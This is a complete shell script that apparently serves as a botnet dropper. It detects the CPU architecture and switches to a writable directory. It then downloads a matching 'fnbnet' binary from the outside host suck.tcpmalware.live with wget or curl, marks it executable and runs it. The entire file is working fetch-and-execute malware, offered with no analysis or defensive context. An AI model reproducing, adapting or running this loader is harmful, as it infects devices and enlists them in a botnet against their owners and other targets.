#!/bin/sh

H="${HOST:-suck.tcpmalware.live}"
D="/tmp"
cd "$D" 2>/dev/null || cd /var/run 2>/dev/null || cd /mnt 2>/dev/null || cd / 2>/dev/null || true

a=$(uname -m)
case "$a" in
  i686|x86_64|i86pc)    b=fnbnet.x86;  arch=x86 ;;
  armv7l|armhf|armv7*)  b=fnbnet.arm7; arch=arm7 ;;
  armv5l|armv6l|armv4l|arm) b=fnbnet.arm; arch=arm ;;
  mips)                 b=fnbnet.mips; arch=mips ;;
  mipsel)               b=fnbnet.mpsl; arch=mpsl ;;
  ppc|powerpc)          b=fnbnet.ppc;  arch=ppc ;;
  *)                    b=fnbnet.x86;  arch=x86 ;;
esac

wget -q "http://$H/bins/$b" -O "$D/$b" 2>/dev/null || curl -s "http://$H/bins/$b" -o "$D/$b" 2>/dev/null
chmod +x "$D/$b" 2>/dev/null
exec "$D/$b" "$arch"
